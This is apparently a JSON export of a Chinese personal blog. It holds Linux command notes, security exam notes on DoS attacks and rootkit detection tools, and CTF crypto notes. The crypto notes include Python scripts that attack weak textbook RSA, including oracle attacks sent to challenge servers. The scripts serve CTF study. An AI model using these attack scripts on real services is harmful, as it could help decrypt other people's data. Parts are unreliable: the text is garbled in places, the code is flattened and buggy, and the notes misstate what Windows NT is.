[{"title":"Linux 学习","url":"/2022/09/09/Linux/","content":"Linux：\n\n\nFHS\n\n\n第一个字符代表这个档案是『目彔、档案戒链接文件等等』：\no 当为 [d] 则是目彔，例如上表档名为『.gconf』的那一行；\no 当为 [-] 则是档案，例如上表档名为『install.log』那一行；\no 若是 [l] 则表示为连结档 (link file)； o 若是[b] 则表示为装置文件里面的可供储存的接口讴备(可随机存取装置)； \no 若是 [c] 则表示为装置文件里面的串行端口讴备，例如键盘、鼠标(一次怅读取装置)。\n\n\n\n\n\n\n\n\n\n\n\n\n\n别名：alias host=&#x27;hostnamectl  set-hostname&#x27;alias host---- 了解 host 如何定义的unalias host----- 删除别名alias------ 查看别名\n\n系统优先使用别名，原始命令也可改成别名，\\hostname 表示使用原始命令，仅对当前目录有效写入：~&#x2F;.bashrc  , 对所有用户有效 &#x2F;etc&#x2F;bashrc\n了解硬件信息：查看 CPUlscpucat /proc/cpuinfo查看内存 freefree -hcat /proc/meminfo 查看磁盘lsblk\n\n了解软件信息：查看系统架构 arch 查看内核版本 uname -r 查看操作系统版本cat /etc/os-releaselsb_release -a\n\n时间  系统时间，硬件时间（时钟）\ndate--- 系统时间clock-- 时钟clock -s --- 以硬件时间更改系统时间clock -w  -- 以系统时间更改硬件时间timedatectl  --- 可用来改时区timedatectl list-timezones--- 查看可更改时区timedatectl set-timezone Asia/Tokyo-- 更改为东京时区  /etc/localtime\n\n文本编辑nanogedit\n\n\n会话管理screen\ntmux\n输出信息echo\n命令行扩展使用:&#96;&#96;or$()echo &quot;Today is `date +%F`&quot;\n\n\n\n\n\n\n\n&#x2F;etc&#x2F;DIR_CLORS 约定什么文件格式对应的颜色 \n通配符\n\n正则表达式\n字符匹配\n\n匹配次数\n位置锚定\n\n分组与其他\n扩展正则表达式\n\n\nShell 编程  调试方法\n\n变量\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n格式化输出\n\n算术运算\n\nnamp\n\n","categories":["Linux学习1"],"tags":["Linux"]},{"title":"hvv","url":"/2022/05/18/hvv/","content":"HVV 测试题目：1\necho 是一个计算机命令，它可以基于 TCP 协议，服务器就在 TCP 端口 7 检测有无消息，如果使用 UDP 协议，基本过程和 TCP 一样，检测的端口也是 7。 是路由也是网络中最常用的数据包，可以通过发送 echo 包知道当前的连接节点有那些路径，并且通过往返时间能得出路径长度。\n\nping 用于确定本地主机是否能与另一台主机成功交换 (发送与接收) 数据包，再根据返回的信息，就可以推断 TCP&#x2F;IP 参数是否设置正确，以及运行是否正常、网络是否通畅等。Ping 命令可以进行以下操作 [3]  :①通过将 ICMP(Internet 控制消息协议)回显数据包发送到计算机并侦听回显回复数据包来验证与一台或多台远程计算机的连接。②每个发送的数据包最多等待一秒。③打印已传输和接收的数据包数。需要注意的是，Ping 成功并不一定就代表 TCP&#x2F;IP 配置正确，有可能还要执行大量的本地主机与远程主机的数据包交换，才能确信 TCP&#x2F;IP 配置的正确性。如果执行 ping 成功而网络仍无法使用，那么问题很可能出在网络系统的软件配置方面，ping 成功只保证当前主机与目的主机间存在一条连通的物理路径\n2\nMicrosoft Windows NT 是微软发布的操作系统，NT 就是 new technology 的意思，我们通常叫 windows NT 位 ie 的内核，注意，不是发行版本 (向 win10，win7 的叫法)，每个发行版本对应一个 ie 内核， 以上的 windows NT10.0 就是 ie 的内核版本， 微软成立的 20 年间已推出 21 个 Windows NT 操作系统。\n3\n(70 条消息) linux 创建用户，添加及修改 shell_@Hmily@的博客 -CSDN 博客_linux 用户 shell\n拒绝服务攻击  常见的几种拒绝服务类攻击（DoS） - superfox - 博客园 (cnblogs.com)\n常见拒绝服务攻击总结 - Z-fadeaway - 博客园 (cnblogs.com)\nping of death:在因特网上，ping of death 是一种畸形报文攻击，方法是由攻击者故意发送大于 65535 字节的 ip 数据包给对方。 TCP&#x2F;IP 的特征之一是碎裂；它允许单一 IP 包被分为几个更小的数据包。\nICMP 的回送请求和应答报文通常是用来检查网路连通性，对于大多数系统而言，发送 ICMP echo request 报文的命令是 ping ，由于 ip 数据包的最大长度为 65535 字节。而 ICMP 报头位于数据报头之后，并与 ip 数据包封装在一起，因此 ICMP 数据包最大尺寸不超过 65535 字节利用这一规定，可以向主机发动 ping of death 攻击。ping of death 攻击 是通过在最后分段中，改变其正确的偏移量和段长度的组合，使系统在接收到全部分段并重组报文时总的长度超过了 65535 字节，导致内存溢出，这时主机就会出现内存分配错误而导致 TCP&#x2F;IP 堆栈崩溃，导致死机！\nL0phtCrack:L0phtCrack 是在 NT 平台上使用的口令审计工具。它能通过保存在 NT 操作系统中 cryptographic hashes 列表来破解用户口令的。通常为了安全起见，用户的口令都是在经过加密之后保存在 hash 列表中的。这些敏感的信息如果被攻击者获得，他们不仅可能会得到用户的权限，也可能会得到系统管理员的权限。这后果将不堪设想。L0phtCrack 可通过各种不同的破解方法对用户的口令进行破解。\nTCP session hijacking:TCP 会话劫持是通过受保护网络对用户会话的安全攻击。会话劫持的最常见方法称为 IP 欺骗，即攻击者使用源路由的 IP 数据包将命令插入到网络上两个节点之间的活动通信中，并将其伪装成经过身份验证的用户之一。这种类型的攻击是可能的，因为身份验证通常仅在 TCP 会话开始时完成。\n另一种类型的会话劫持被称为中间人攻击，攻击者使用嗅探器可以观察设备之间的通信并收集传输的数据。\nTeardrop:Teardrop 攻击是一种拒绝服务攻击。是基于 UDP 的病态分片数据包的攻击方法，其工作原理是向被攻击者发送多个分片的 IP 包（IP 分片数据包中包括该分片数据包属于哪个数据包以及在数据包中的位置等信息），某些操作系统收到含有重叠偏移的伪造分片数据包时将会出现系统崩溃、重启等现象。\nHOOK对于 Window 系统, 它是建立在事件驱动机制上. 整个系统都是通过消息传递实现的.hook（钩子）是一种特殊的消息处理机制, 它可以监视系统或者进程中的各种事件消息, 截获发往目标窗口的消息并进行处理\n(70 条消息) HOOK API 技术_桑来 93 的博客 -CSDN 博客_hookapi\nAutorunsAutoruns for Windows 是 Mark Russinovich 和 Bryce Cogswell 开发的一款软件，它能用于显示在 Windows 启动或登录时自动运行的程序，并且允许用户有选择地禁用或删除它们，例如那些在“启动”文件夹和注册表相关键中的程序。此外，Autoruns 还可以修改包括：Windows 资源管理器的 Shell 扩展（如右键弹出菜单）、IE 浏览器插件（如工具栏扩展）、系统服务和设备驱动程序、计划任务等多种不同的自启动程序。Autoruns 作为 Sysinternals Suite（故障诊断工具套装）的一部分，可运行于 Windows XP、Windows Server 2003 和更高版本的 Windows 操作系统。该软件还包括一个相同功能的命令行版本 Autorunsc，可以把结果报表以 CSV 格式输出。\nRootkitRevealerRootkitRevealer 是一种高级 rootkit 检测实用工具。 它在 WINDOWS XP (32 位) 和 Windows Server 2003 (32 位) 上运行，其输出列出了注册表和文件系统 API 差异，这些差异可能指示存在用户模式或内核模式 rootkit。 RootkitRevealer 成功检测许多永久性 rootkit，包括 AFX、Vanquish 和 HackerDefender (注意：RootkitRevealer 不打算检测未尝试隐藏其文件或注册表项的 rootkit) 。 \n什么是 Rootkit？术语 rootkit 用于描述恶意软件（包括病毒、间谍软件和特洛伊木马）试图从间谍软件阻止程序、防病毒和系统管理工具中隐藏其存在的机制和技术。 有几个 rootkit 分类取决于恶意软件是否在重新启动后运行，以及它是否在用户模式或内核模式下执行。\nchkrootkitchkrootkit 是一种在本地检查 rootkit 迹象的工具。它包含：\nchkrootkit：检查系统二进制文件是否有 rootkit 修改的 shell 脚本。ifpromisc.c：检查接口是否处于混杂模式。chklastlog.c：检查最后一个日志的删除。chkwtmp.c：检查 wtmp 删除。check_wtmpx.c：检查 wtmpx 删除。（仅限 Solaris）chkproc.c：检查 LKM 木马的迹象。chkdirs.c：检查 LKM 木马的迹象。字符串.c：快速和肮脏的字符串替换。chkutmp.c：检查 utmp 删除。\nlistDLLSList DLL 是一个实用程序，用于报告加载到进程中的 DLL。您可以使用它列出加载到所有进程中的所有 DLL、特定进程或列出加载了特定 DLL 的进程。List DLL 还可以显示 DLL 的完整版本信息（包括其数字签名），并可用于扫描进程中的未签名 DLL。\nISSIIS 是缩写，全称 Internet Information Services (IIS, 互联网信息服务), 是由微软公司提供的基于运行 Microsoft Windows 的互联网基本服务。IIS 是指 World Wide Web server 服务，IIS 是一种 Web（网页）服务组件，专业的说，IIS 可以赋予一部主机电脑一组以上的 IP 地址，而且还可以有一个以上的域名作为 Web 网站。 . 做过服务器配置的都应该知道 IIS. . 制作好了网站怎么才能让别人浏览，就是通过网站服务器来实现的。IIS 只是网站服务器的一种而已。\nIIS 5.0 是用于 Windows 2000 Server 系列服务器的网络和应用程序服务器。它是建立 Internet &#x2F;Intranet 的基本组件之一。IIS 5.0 也是允许在 Internet&#x2F;Intranet 上发布信息的 Web 服务器。IIS 通过超文本传输协议（HTTP）传输信息，还可配置 IIS 以提供文件传输协议（FTP）和其他服务，如 NNTP 服务、SMTP 服务等。\nIIS 就相当于把你的机器变成一个服务器用来浏览网页。后记：\nIIS 服务器 HTTP 状态码：(70 条消息) IIS 7.0、IIS 7.5 和 IIS 8.0 中的 HTTP 状态代码_kufeiyun 的博客 -CSDN 博客\nIIS 默认安装后，默认用户名是 IUSR_XXX(XXX 是主机名)\n除了通过修改 HTTP 500 的错误页面信息外，另一种方式是自定义脚本错误信息(70 条消息) linux iis 错误,IIS 错误响应消息以及如何屏蔽_冰鬼的博客 -CSDN 博客\n缺省  缺省即默认的意思。例如缺省的 HTTP 端口是 (80)。 缺省是一种计算机术语，指在无决策者干预情况下，对于决策或应用软件、计算机程序的系统参数的自动选择。默认选项的设计可以在用户不须决策的状况下就可以基础地使用上述的软件与程序。\nunix 系统日志UNIX 系统日志_w3cschool\n常见端口表(70 条消息) 常用端口对照表（经典）_iteye_10989 的博客 -CSDN 博客\n嗅探器Tcpdump、wireshark、windump 需要 winpcap 支持\nNAI Sniffer 不需要 winpcap（libcap）支持\n包过滤系统  包过滤技术的原理，它的作用、优点以及局限性！ - 新闻公告 - 亿速云 (yisu.com)\n身份认证双因素  身份认证之双因素认证 2FA - 知乎 (zhihu.com)\n针对统计数据库的攻击 小查询集合大查询集攻击 中值攻击 跟踪攻击\n数据库安全模型  安全模型也被称为策略表达模型，是一种对安全需求与安全策略的抽象概念模型。数据库安全模型是系统安全模望在数据库系统中的一种特殊表达形式，是安全策略在数据库系统中的表达模型，它描述了数据库系统中的安全需求与安全策略。安全策略是安全体系结构中的重要组成部分。安全策略是一组规定如何管理、保护和指派敏感信息的法律、法规和实践经验的集合。\n安全策略表达模型一般分为两大类，即自主访问控制 (DAC) 和强制访问控制 (MAC)。自主访问控制中，用户对信息的访问是基于用户的鉴别和访问控制规则的确定，每个用户都要给予系统中每个访问对象的访问权限。自主访问控制模型的典型代表有 HRU 模型(Harrison、Ruzzo、Ullman 访问控制矩阵模型)、Jones 取予模型 Take-Grant 模型)、动作一一实体模型等。在强制访问控制中，系统给主体和客体分配了不同的安全标记，通过比较主体和客体的安全标记是否匹配，来决定是否允许访问。强制访问控制的典型代表有 BLP 模型(Bell-La Padula 模型)、基于角色的存取控制模型、Clark-Wilson 模型、BN 模型(Brewer Nash Chinese Wall 模型) 等。在数据库安全领域，还有 Wood 模型、Smith Winslett 模型等。\n一般而言，数据库中需要满足的安全策略应该满足以下一些原则：\n1. 最小特权原则\n2. 最大共享原则\n3. 开放系统原则和封闭系统原则\n","categories":["hvv"],"tags":["hvv"]},{"title":"Hello World","url":"/2022/05/20/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n"},{"title":"CTFcrypto","url":"/2022/05/19/CTFcrypto/","content":"栅栏密码  栅栏密码把要加密的明文分成 N 个一组，然后把每组的第 1 个字连起来，形成一段无规律的话。\n明文：THERE IS A CIPHER\n\n去掉空格后变为\nTHEREISACIPHER\n\n分成两栏，两个一组得到\nTH ER EI SA CI PH ER\n\n先取出第一个字母，再取出第二个字母\nTEESCPEHRIAIHR\n\n连在一起就是\nTEESCPEHRIAIHR\n\n上述明文也可以分为 2 栏。\nTHEREIS ACIPHER\n\n组合得到密文\nTAHCEIRPEHIESR\n\n摩斯密码  培根密码  培根密码使用两种不同的字体，代表 A 和 B，结合加密表进行加解密。\n\n\n\na\nAAAAA\ng\nAABBA\nn\nABBAA\nt\nBAABA\n\n\n\nb\nAAAAB\nh\nAABBB\no\nABBAB\nu-v\nBAABB\n\n\nc\nAAABA\ni-j\nABAAA\np\nABBBA\nw\nBABAA\n\n\nd\nAAABB\nk\nABAAB\nq\nABBBB\nx\nBABAB\n\n\ne\nAABAA\nl\nABABA\nr\nBAAAA\ny\nBABBA\n\n\nf\nAABAB\nm\nABABB\ns\nBAAAB\nz\nBABBB\n\n\n上面的是常用的加密表。还有另外的一种加密表，可认为是将 26 个字母从 0 到 25 排序，以二进制表示，A 代表 0，B 代表 1。\n下面这一段内容就是明文 steganography 加密后的内容，正常字体是 A，粗体是 B：\nTo encode a message each letter of the plaintext is replaced by a group of five of the letters ‘A’ or ‘B’.\n可以看到，培根密码主要有以下特点\n\n只有两种字符\n每一段的长度为 5\n加密内容会有特殊的字体之分，亦或者大小写之分。\n\nBase 编码 ¶base xx 中的 xx 表示的是采用多少个字符进行编码，比如说 base64 就是采用以下 64 个字符编码，由于 2 的 6 次方等于 64，所以每 6 个比特为一个单元，对应某个可打印字符。3 个字节就有 24 个比特，对应于 4 个 Base64 单元，即 3 个字节需要用 4 个可打印字符来表示。它可用来作为电子邮件的传输编码。在 Base64 中的可打印字符包括字母 A-Z、a-z、数字 0-9，这样共有 62 个字符，此外两个可打印符号在不同的系统中而不同。\nJSfuckJSFuck 是一种基于 JavaScript 原子部分的深奥和教育性的编程风格。它仅使用六个不同的字符来编写和执行代码。\n它不依赖于浏览器，因此您甚至可以在 Node.js 上运行它。\n基本false       =&gt;  ![]true        =&gt;  !![]undefined   =&gt;  [][[]]NaN         =&gt;  +[![]]0           =&gt;  +[]1           =&gt;  +!+[]2           =&gt;  !+[]+!+[]10          =&gt;  +[[+!+[]]+[+[]]]Array       =&gt;  []Number      =&gt;  +[]String      =&gt;  []+[]Boolean     =&gt;  ![]Function    =&gt;  [][&quot;filter&quot;]run         =&gt;  [][&quot;filter&quot;][&quot;constructor&quot;](CODE)()eval        =&gt;  [][&quot;filter&quot;][&quot;constructor&quot;](&quot;return eval&quot;)()( CODE)window      =&gt;  [][&quot;filter&quot;][&quot;constructor&quot;](&quot;return this&quot;)()\n\n完整列表：jsfuck&#x2F;jsfuck.js at master · aemkei&#x2F;jsfuck · GitHub\n可在浏览器控制台运行。\nAAEncodehttp://www.atoolbox.net/Tool.php?Id=703\nRabbit\nhttp://www.jsons.cn/rabbitencrypt/\nOok 编码[Brainfuck&#x2F;Ook! Obfuscation&#x2F;Encoding splitbrain.org]\nBrainfuck 解释器[Brainfuck&#x2F;Ook! Obfuscation&#x2F;Encoding splitbrain.org]\nSerpent 加密http://serpent.online-domain-tools.com/\n可以用 ARCHPR 暴力破解压缩包\nQuoted-printable 编码  一堆等号连接的 16 进制数对 -Quoted-printable 编码\nhttp://web.chacuo.net/charsetquotedprintable\nMD5 碰撞https://www.somd5.com/\nMD5 是什么 MD5 信息摘要算法（英语：MD5 Message-Digest Algorithm），一种被广泛使用的密码散列函数，可以产生出一个 128 位（16[字节] 的散列值（hash value）），用于确保信息传输完整一致。MD5 由美国密码学家 [罗纳德·李维斯特]（Ronald Linn Rivest）设计，于 1992 年公开，用以取代[MD4] 算法。这套算法的程序在 RFC 1321 标准中被加以规范。1996 年后该算法被证实存在弱点，可以被加以破解，对于需要高度安全性的数据，专家一般建议改用其他算法，如 [SHA-2]。2004 年，证实 MD5 算法无法防止碰撞，因此不适用于安全性认证，如[SSL] 公开密钥认证或是 [数字签名] 等用途。\nMD5 碰撞原理简单介绍及其实现 - wysng - 博客园 (cnblogs.com)\nURL 解码http://www.urlencode.com.cn/\nRSARSA 算法  密钥生成的步骤\n我们通过一个例子，来理解 RSA 算法。假设爱丽丝要与鲍勃进行加密通信，她该怎么生成公钥和私钥呢？\n第一步，随机选择两个不相等的质数 p 和 q。\n爱丽丝选择了 61 和 53。（实际应用中，这两个质数越大，就越难破解。）\n第二步，计算 p 和 q 的乘积 n。\n爱丽丝就把 61 和 53 相乘。\n\nn &#x3D; 61×53 &#x3D; 3233\n\nn 的长度就是密钥长度。3233 写成二进制是 110010100001，一共有 12 位，所以这个密钥就是 12 位。实际应用中，RSA 密钥一般是 1024 位，重要场合则为 2048 位。\n第三步，计算 n 的欧拉函数φ(n)。\n\nn 是质数，则 φ(n)&#x3D;n-1n &#x3D; p1 × p2φ(n) &#x3D; φ(p1p2) &#x3D; φ(p1)φ(p2)&#x3D;&gt; φ(n) &#x3D; (p-1)(q-1)\n\n爱丽丝算出φ(3233)等于 60×52，即 3120。\n第四步，随机选择一个整数 e，条件是 1&lt; e &lt; φ(n)，且 e 与φ(n) 互质。\n爱丽丝就在 1 到 3120 之间，随机选择了 17。（实际应用中，常常选择 65537。）\n第五步，计算 e 对于φ(n)的模反元素 d。\n所谓”模反元素”就是指有一个整数 d，可以使得 ed 被φ(n)除的余数为 1。\n\ned ≡ 1 (mod φ(n))\n\n这个式子等价于\n\ned - 1 &#x3D; kφ(n)\n\n于是，找到模反元素 d，实质上就是对下面这个二元一次方程求解。(-k &#x3D; y)\n\nex + φ(n)y &#x3D; 1\n\n已知 e&#x3D;17, φ(n)&#x3D;3120，\n\n17x + 3120y &#x3D; 1\n\n这个方程可以用 “扩展欧几里得算法”(又叫辗转相除法) 求解，此处省略具体过程。总之，爱丽丝算出一组整数解为 (x,y)&#x3D;(2753,-15)，即 d&#x3D;2753。\n至此所有计算完成。\n第六步，将 n 和 e 封装成公钥，n 和 d 封装成私钥。\n在爱丽丝的例子中，n&#x3D;3233，e&#x3D;17，d&#x3D;2753，所以公钥就是 (3233,17)，私钥就是（3233, 2753）。\n实际应用中，公钥和私钥的数据都采用 ASN.1 格式表达。\nRSA 算法的加密和解密  有了公钥和密钥，就能进行加密和解密了。\n(1)加密要用公钥(n,e)\n假设鲍勃要向爱丽丝发送加密信息 m，他就要用爱丽丝的公钥 (n,e) 对 m 进行加密。这里需要注意，m 必须是整数（字符串可以取 ascii 值或 unicode 值），且 m 必须小于 n。\n所谓”加密”，就是算出下式的 c：\n\n　me ≡ c (mod n)\n\n爱丽丝的公钥是 (3233, 17)，鲍勃的 m 假设是 65，那么可以算出下面的等式：\n\n65^17 ≡ 2790 (mod 3233)\n\n于是，c 等于 2790，鲍勃就把 2790 发给了爱丽丝。\n(2)解密要用私钥(n,d)\n爱丽丝拿到鲍勃发来的 2790 以后，就用自己的私钥(3233, 2753) 进行解密。可以证明，下面的等式一定成立：\n\ncd ≡ m (mod n)\n\n也就是说，c 的 d 次方除以 n 的余数为 m。现在，c 等于 2790，私钥是(3233, 2753)，那么，爱丽丝算出\n\n2790^2753 ≡ 65 (mod 3233)\n\n因此，爱丽丝知道了鲍勃加密前的原文就是 65。\n至此，”加密–解密”的整个过程全部完成。\n我们可以看到，如果不知道 d，就没有办法从 c 求出 m。而前面已经说过，要知道 d 就必须分解 n，这是极难做到的，所以 RSA 算法保证了通信安全。\n你可能会问，公钥(n,e) 只能加密小于 n 的整数 m，那么如果要加密大于 n 的整数，该怎么办？有两种解决方法：一种是把长信息分割成若干段短消息，每段分别加密；另一种是先选择一种”对称性加密算法”（比如DES），用这种算法的密钥加密信息，再用 RSA 公钥加密 DES 密钥。\n(71 条消息) RSA 加密算法_gao131360144 的博客 -CSDN 博客_rsa 加密算法\n依赖库：\n\ngmpy2\npycrypto\n\nRSA 原理  私钥 n,d，公钥 n,e。其中 n 是两个素数 p,q 的乘积。c 为密文，m 为明文。φ(n)为欧拉函数。其中:d 是 e 模φ(n)的逆元。我们有φ(n)&#x3D;(p−1)(q−1)\ned≡1modφ(n)\nencrypt:c≡memodn\ndecrypt:m≡cdmodn\nopenssl 使用  使用 openssl 查看 pem 文件：\nopenssl rsa -pubin -text -modulus -in public.pem\n\n使用 openssl 和私钥解密\nopenssl rsautl -decrypt -in flag -inkey privatekey -out flag.txt\n\n常规  场景  已知 p、q、c\n解法  求φ(n)，再求出 d 即可\nfrom Crypto.Util.number import inverse,long_to_bytesp = q = n = p*qphi = (p-1)*(q-1)e = d = inverse(e,phi)c = m = pow(c,d,n)print(long_to_bytes(m))\n\n模不互素  场景  已知如下：\nn1&#x3D;p×q1\nn2&#x3D;p×q2\nc1&#x3D;memodn1\nc2&#x3D;memodn2\n解法  求出 n1 和 n2 的公因子，即可解得 p 和 q\nfrom libnum import xgcdfrom Crypto.Util.number import inverse,long_to_bytesn1 = n2 = c1 = c2 = e = p = xgcd(n1,n2)[2]q1 = n1//pq2 = n2//pphi1=(p-1)*(q1-1)phi2=(p-1)*(q2-1)d1 = inverse(e,phi1)d2 = inverse(e,phi2)m1 = pow(c1,d1,n1)m2 = pow(c2,d2,n2)print(long_to_bytes(m1))print(long_to_bytes(m2))\n\n共模攻击  场景  模数 n 相同，指数、e1、e2 不同且互质\n已知：\nc1&#x3D;me1modn\nc2&#x3D;me2modn\n解法  根据扩展欧几里得算法求出 re1+se2&#x3D;1modn 的整数、r、s\n根据(1)c1rc2s≡mre1mse2modn≡mmodn 得到明文\nfrom libnum import xgcdfrom Crypto.Util.number import inverse,long_to_bytesn = c1 = c2 = e1 = e2 = s = xgcd(e1,e2)s1 = s[0]s2 = s[1]if s1 &lt; 0:    s1 = - s1    c1 = inverse(c1, n)elif s2 &lt; 0:    s2 = - s2    c2 = inverse(c2, n)m = pow(c1, s1, n)*pow(c2, s2, n) % n print(long_to_bytes(m))\n\ne 小指数攻击  场景  当 e 很小的时候，例如 2、3，此时可能可以通过直接暴力开根的方式进行攻击\n解法  以 e&#x3D;3 为例，已知 c≡m3modn，因此有：m3&#x3D;c+kN\nm&#x3D;c+kN3\nimport gmpy2from Crypto.Util.number import long_to_bytesn = e = 3c = i = 0while(True):    a,b = gmpy2.iroot(c+i*n,3)    if(b==1):        print(long_to_bytes(a))        exit(0)\n\nRabin 攻击  场景  当指数 e&#x3D;2，且已知 p 和 q\n解法\n计算\nmp&#x3D;c2modp\nmq&#x3D;c2modq\n\n扩展欧几里得求 yp 和 yq\nypp+yqq&#x3D;1\n\n解得 4 个明文\na&#x3D;(yp⋅p⋅mq+yq⋅q⋅mp)modn\nb&#x3D;n−a\nc&#x3D;(yp⋅p⋅mq−yq⋅q⋅mp)modn\nd&#x3D;n−c\n\n条件：当 p≡q≡3mod4 时，有\nmp&#x3D;c(p+1)&#x2F;4modp\nmq&#x3D;c(q+1)&#x2F;4modq\n\n\n满足条件时import gmpy2def rabin_decrypt(c, p, q, e=2):    n = p * q    mp = pow(c, (p + 1) / 4, p)    mq = pow(c, (q + 1) / 4, q)    yp = gmpy2.invert(p, q)    yq = gmpy2.invert(q, p)    r = (yp * p * mq + yq * q * mp) % n    rr = n - r    s = (yp * p * mq - yq * q * mp) % n    ss = n - s    return (r, rr, s, ss)\n\n不满足条件时  转换为模平方根问题\n\n用 python（代码来自 yuri）\n\nimport gmpy2import randomdef exgcd(r0, r1):    x0, y0 = 1, 0    x1, y1 = 0, 1    x, y = r0, r1    r = r0 % r1    q = r0 // r1    while r:        x, y = x0 - q * x1, y0 - q * y1        x0, y0 = x1, y1        x1, y1 = x, y        r0 = r1        r1 = r        r = r0 % r1        q = r0 // r1    return xdef Jacobi(n, m):    n = n % m    if n == 0:        return 0    Jacobi2 = 1    if not (n &amp; 1):        k = (-1) ** (((m**2 - 1) // 8) &amp; 1)        while not (n &amp; 1):            Jacobi2 *= k            n &gt;&gt;= 1    if n == 1:        return Jacobi2    return Jacobi2 * ((-1) ** ((((m - 1) // 2) * ((n - 1) // 2)) &amp; 1)) * Jacobi(m % n, n)def CRT(b, m):     M = 1    for i in range(len(b)):        M *= m[i]    ans = 0    for i in range(len(b)):        ans += b[i] * M // m[i] * exgcd(M // m[i], m[i])    return ans % Mdef solve(a, p):    a_1 = gmpy2.invert(a, p)    s = p - 1    t = 0    while s % 2 == 0:        t += 1        s &gt;&gt;= 1    n = 0    while True:        n = random.randint(1, p-1)        if Jacobi(n, p) == -1:            break    b = pow(n, s, p)    x_t_1 = pow(a, (s+1)//2, p)    assert pow(b, 2**t, p) == 1    assert pow(b, 2**(t-1), p) == p-1    x, j, temp = 0, 0, 0    for i in range(0, t-1):        x = pow(a_1*(x_t_1**2), 2**(t-2), p)        if x == 1:            j = 0        elif x == p-1:            j = 1        else:            exit(0)        t -= 1        temp = x_t_1        x_t_1 = (x_t_1 * (b**(j**(2**i)))) % p    else:         if x == 1:            return temp, -temp % pp = q = n = p * qe = 2c = a, b = None, Nonewhile True:    try:        a = solve(c % p, p)        assert pow(a[0], e, p) == c % p        assert pow(a[1], e, p) == c % p        break    except:        passwhile True:    try:        b = solve(c % q, q)        assert pow(b[0], e, q) == c % q        assert pow(b[1], e, q) == c % q        break    except:        passprint(bytes.fromhex(hex(CRT([a[0],b[0]],[p,q]))[2:]))print(bytes.fromhex(hex(CRT([a[0],b[1]],[p,q]))[2:]))print(bytes.fromhex(hex(CRT([a[1],b[0]],[p,q]))[2:]))\n\n\n用 sage\n\n使用一句话 Mod(c_square, q).sqrt(all=True) 分别求出 mp 和 mq，代回去解得可能的明文\nn 分解攻击  当 n 很小或者满足一定条件时，可以进行暴力分解\n\nyafu\nfactordb\n当 d&lt;1&#x2F;3N1&#x2F;4 时，通过 Wiener’s attack 能够攻击得到 d\n当、p、q 十分接近时，可以使用费马分解分解 n\n当 q 较小，即 |p−q| 较大时，可以爆破 q\n当 d&lt;N0.292 时，通过 Boneh Durfee Method 分解 n\n\n广播攻击  场景  给定了不同的模数 ni，但指数 e 相同\n已知:\nc1&#x3D;memodn1\nc2&#x3D;memodn2\nc3&#x3D;memodn3\n解法  使用中国剩余定理进行广播攻击\nfrom gmpy2 import *from Crypto.Util.number import long_to_bytesdef broadcast(n1, n2 ,n3, c1, c2, c3):    n = [n1, n2, n3]    C = [c1, c2, c3]    N = 1    for i in n:        N *= i    Ni = []    for i in n:        Ni.append(N / i)    T = []    for i in range(3):        T.append(long(invert(Ni[i], n[i])))    X = 0    for i in range(3):        X += C[i] * Ni[i] * T[i]    m = X % N    return mn1 = n2 = n3 = e = c1 = c2 = c3 = result = broadcast(n1,n2,n3,c1,c2,c3)m = iroot(result, e)print(long_to_bytes(result))\n\n\n第二部分主要是一些 Oracle 相关的内容\n\n依赖库：\n\ngmpy2\npycrypto\npwntools\nsage\n\n选择密文攻击  场景  假设 Alice 创建密文 C&#x3D;Pemodn，并发送给 Bob，并且我们有一次选择密文进行解密的机会，此时我们可以拦截 C，并通过选择密文攻击，求出 P\n解法\n选择任意一个 G(n)内与 n 互素的 X(一般就是 2 啦)\n计算 Y&#x3D;C×Xemodn\n由于选择密文攻击，将 Y 作为密文我们可以得到 Z&#x3D;Ydmodn\n最后由于  可以通过逆元求出 P\n\nfrom pwn import *from gmpy2 import invertfrom Crypto.Util.number import long_to_bytesp = remote(ip,port)C = n = e = X = 2X_e = pow（X,e,n)p.sendline(str((X_e*c)%n)Z = int(p.recvline())result = (Z*long(invert(X,n)))%nprint(long_to_bytes(result))\n\nparity oracle场景  假设存在一个 Oracle，它会对一个给定的密文进行解密，并且会检查解密的明文的奇偶性，并根据奇偶性返回相应的值，比如 1 表示奇数，0 表示偶数。那么给定一个加密后的密文，我们只需要 log(N) 次就可以知道这个密文对应的明文消息\n解法  假设 C&#x3D;PemodN\n第一次我们发送 C×2e&#x3D;(2P)emodN 给服务器，服务器会返回 2PmodN\n我们知道：\n\n2P 是偶数，因此(2P)e 也是偶数\nN 是奇数（不考虑存在因子为 2 时）\n\n那么：\n\n服务器返回奇数时，说明 2P&gt;N，且减去了奇数个 N 同时我们又知道 P&lt;N，即 N&#x2F;2≤P&lt;N\n服务器返回偶数时，说明 0≤P&lt;N&#x2F;2\n\n归纳：\n假设第 i 次时，我们有\nxN&#x2F;2i≤P&lt;(x+1)N&#x2F;2i\n在第 i+1 次时，我们可以得到\n2i+1PmodN&#x3D;2i+1P−kN\n0≤2i+1P−kN&lt;N\nkN&#x2F;2i+1≤P&lt;(k+1)N&#x2F;2i+1\n根据第 i 次结果我们分子分母同乘 2，有\n2xN&#x2F;2i+1≤P&lt;2(x+1)N&#x2F;2i+1\n那么：\n\n服务器返回奇数，则 k 必然是一个奇数，k&#x3D;2y+1， 那么 (2yN+N)&#x2F;2i+1≤P&lt;(2yN+2N)&#x2F;2i+1。与此同时，由于 P 必然存在，所以第 i+1 得到的这个范围和第 i 次得到的范围必然存在交集。所以 y 必然与 x 相等。\n服务器返回偶数，则 k 必然是一个偶数，k&#x3D;2y，此时 y 必然也与 x 相等，那么 2xN&#x2F;2i+1≤P&lt;(2xN+N)&#x2F;2i+1\n\n总结：\nlb = 0ub = Nif server returns 1    lb = (lb+ub)/2else:    ub = (lb+ub)/2from pwn import *import time,decimal,binasciifrom Crypto.Util.number import long_to_bytesp = remote(ip,port)def oracle(c1):    global p    p.sendline(str(c1))    res = int(p.recvuntil(&quot;\\n&quot;).strip())    if res == 0: return 0    if res == 1:        return 1    else:        assert (0)def partial(c, n):    global c_of_2    k = n.bit_length()    decimal.getcontext().prec = k      lower = decimal.Decimal(0)    upper = decimal.Decimal(n)    for i in range(k):        possible_plaintext = (lower + upper) / 2        flag = oracle(c)        if not flag:            upper = possible_plaintext          else:            lower = possible_plaintext         c = (c * c_of_2) % n          print(i,flag,int(upper - lower))    return 